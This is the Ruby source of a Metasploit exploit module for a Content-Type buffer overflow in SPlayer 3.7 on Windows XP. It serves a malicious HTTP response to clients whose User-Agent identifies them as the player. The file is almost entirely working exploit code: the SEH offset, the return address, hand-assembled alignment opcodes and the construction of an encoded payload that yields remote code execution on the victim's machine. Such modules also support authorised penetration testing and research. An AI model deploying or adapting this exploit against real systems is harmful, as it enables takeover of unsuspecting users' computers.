# $Id: splayer_content_type.rb 12581 2011-05-11 00:18:11Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "SPlayer 3.7 Content-Type Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in SPlayer v3.7 or piror.  When SPlayer
                requests the URL of a media file (video or audio), it is possible to gain arbitrary
                remote code execution due to a buffer overflow caused by an exceeding length of data
                as the &#039;Content-Type&#039; parameter.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 12581 $",
            &#039;Author&#039;         =>
                [
                    &#039;xsploitedsec <xsploitedsecurity[at]gmail.com>&#039;,  #Initial discovery, PoC
                    &#039;sinn3r&#039;, #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17243/&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;        => "\x00\x0a\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;EncoderType&#039;     => Msf::Encoder::Type::AlphanumMixed,
                    &#039;BufferRegister&#039;  => &#039;ECX&#039;,
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039;         => "seh",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP2/XP3&#039;,
                        {
                            &#039;Offset&#039; => 2073,    #Offset to SEH
                            &#039;Ret&#039;    => 0x7325,  #Unicode P/P/R (splayer.exe)
                            &#039;Max&#039;    => 30000,   #Max buffer size
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "May 4 2011",
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def get_unicode_payload(p)
        encoder = framework.encoders.create("x86/unicode_mixed")
        encoder.datastore.import_options_from_hash( {&#039;BufferRegister&#039;=>&#039;EAX&#039;} )
        unicode_payload = encoder.encode(p, nil, nil, platform)
        return unicode_payload
    end
 
    def on_request_uri(cli, request)
 
        agent = request.headers[&#039;User-Agent&#039;]
        if agent !~ /Media Player Classic/
            send_not_found(cli)
            print_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")
            return
        end
 
        nop = "\x73"
 
        #MOV EAX,EDI; XOR AL,C3; INC EAX; XOR AL,79; PUSH EAX; POP ECX; JMP SHORT 0x40
        alignment = "\x8b\xc7\x34\xc3\x40\x34\x79\x50\x59\xeb\x40"
        padding = nop*6
        p = get_unicode_payload(alignment + padding + payload.encoded)
 
        sploit = rand_text_alpha(2073)
        sploit << "\x61\x73"
        sploit << "\x25\x73"
        sploit << nop
        sploit << "\x55"
        sploit << nop
        sploit << "\x58"
        sploit << nop
        sploit << "\x05\x19\x11"
        sploit << nop
        sploit << "\x2d\x11\x11"
        sploit << nop
        sploit << "\x50"
        sploit << nop
        sploit << "\x50"
        sploit << nop
        sploit << "\x5f"
        sploit << nop
        sploit << "\xc3"
        sploit << rand_text_alpha(1000)
        sploit << p
        sploit << rand_text_alpha(target[&#039;Max&#039;]-sploit.length)
 
        print_status("Sending malicious content-type to #{cli.peerhost}:#{cli.peerport}...")
        send_response(cli, &#039;&#039;, {&#039;Content-Type&#039;=>sploit})
 
    end
 
end



